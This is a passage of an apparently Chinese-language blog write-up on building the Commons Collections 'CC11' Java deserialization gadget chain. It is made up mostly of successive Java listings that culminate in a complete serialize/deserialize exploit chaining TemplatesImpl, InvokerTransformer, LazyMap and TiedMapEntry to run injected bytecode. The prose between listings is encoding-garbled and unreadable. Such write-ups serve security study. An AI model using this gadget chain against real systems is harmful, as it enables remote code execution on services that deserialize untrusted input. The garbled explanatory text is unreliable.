class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">lazyGetMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        lazyGetMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        lazyGetMethod.invoke(lazyMap, chainedTransformer);  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞±ÊòØÂíå<code>TiedMapEntry</code> Á±ªËøûËµ∑Êù•ÔºåÂõ†‰∏∫<code>TiedMapEntry</code> Á±ª‰∏≠ÁöÑ <code>getValue()</code> ÊñπÊ≥ïË∞ÉÁî®‰∫Ü <code>LazyMap</code> ÁöÑ <code>get()</code> ÊñπÊ≥ïÔºåÈÇ£‰πàexpÂ∞±ÊòØ‰∏ãÈù¢ËøôÊ†∑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁªßÁª≠ÂæÄÂâçÂç≥<code>hashCode()</code> ÊñπÊ≥ïË∞ÉÁî®‰∫Ü <code>getValue()</code> ÊñπÊ≥ïËÄå<code>hashCode()</code>ÊñπÊ≥ïË∞ÉÁî®Âú®ÂâçÈù¢Â∑≤ÁªèÂàóËøá‰∫ÜÊâÄ‰ª•Áõ¥Êé•ÊûÑÈÄ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates, codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        serialize(map);  </span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âú®Ë∞ÉÁî®ËøôÊÆµ‰ª£Á†ÅÁöÑÊó∂ÂÄôÊàë‰ª¨ÂèëÁé∞‰ºöÁõ¥Êé•Â∫èÂàóÂåñÁöÑÊó∂ÂÄô‰ºöÁõ¥Êé•ÂºπÂá∫ËÆ°ÁÆóÂô®ÔºåËøôÈáåÂÖ∂ÂÆûÂíåurldnsÈìæÁ±ª‰ººÔºåËøôÈáåÂú®Ë∞ÉËØïÁöÑÂèàÈÅáÂà∞‰∫ÜÂíåÊàë‰∏äÊ¨°Ë∞ÉËØïCC7ÁöÑÊó∂ÂÄô‰∏ÄÊ†∑ÁöÑÈóÆÈ¢òÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108523.png" alt="image-20230715110839336"><br>ÊúÄÁªàÊ≤°ËÉΩËß£ÂÜ≥Ôºå‰∏äÊ¨°ÊòØÂõ†‰∏∫Ëøá‰∫Ü‰∏ÄÂ§©ÂÜçÂºÑËá™Â∑±Â∞±Â•Ω‰∫ÜÔºåÁé∞Âú®ÂèàÊòØËøôÊ†∑ÔºåÂìéÔºåÈöæÊêû<br>ËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØCC6‰∏≠ÁöÑÈóÆÈ¢òÔºåÂá∫Âú®<code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>ËøôÊù°ËØ≠Âè•‰∏äÔºåËøôÈáåputÊñπÊ≥ï‰πü‰ºöË∞ÉÁî®Âà∞hashÊñπÊ≥ïÔºå‰ΩÜÊòØÊàë‰ª¨ÈúÄË¶ÅÁöÑÊòØputValÈáåÈù¢ÁöÑhashÊñπÊ≥ïÂØπkeyËøõË°åËÆ°ÁÆóÊâÄ‰ª•Â∞±ÈúÄË¶ÅÈÄöËøáÂèçÂ∞ÑÂØπputÊîπÂÄºÔºåËÆ©‰ªñ‰∏çËß¶ÂèëËøôÊù°ÈìæÁÑ∂ÂêéÂÜçputÂÆå‰πãÂêéÂÜçÂèçÂ∞ÑÊîπÂõûÊù•ÔºåÊúÄÁªàÁöÑ‰ª£Á†ÅÂèØ‰ª•Ë∞ÉËØïÔºå‰ΩÜÊòØÊ≤°ÊòéÁôΩ‰∏äÈù¢ÁöÑ‰∏∫‰ªÄ‰πà‰∏çÂèØ‰ª•ÔºüÁÑ∂ÂêéËøôÈáåËøòÊúâ‰∏™ÈóÆÈ¢òÂ∞±ÊòØputÁöÑÊó∂ÂÄô‰ºö‰º†ÂÖ•‰∏Ä‰∏™keyÂèçÂ∫èÂàóÂåñÊó†Ê≥ïËøõÂÖ•ifÊâßË°åtransformÊñπÊ≥ïÔºåÊâÄ‰ª•ÈúÄË¶ÅÂà†ÊéâËøô‰∏™key<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108022.png" alt="image-20230715110851891"><br>ÊúÄÁªàÁöÑ‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates, codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  </span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        serialize(map);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="‰∏çÂ∏¶-Transformer-Êï∞ÁªÑÁöÑ-CC11-ÈìæÂ≠ê"><a 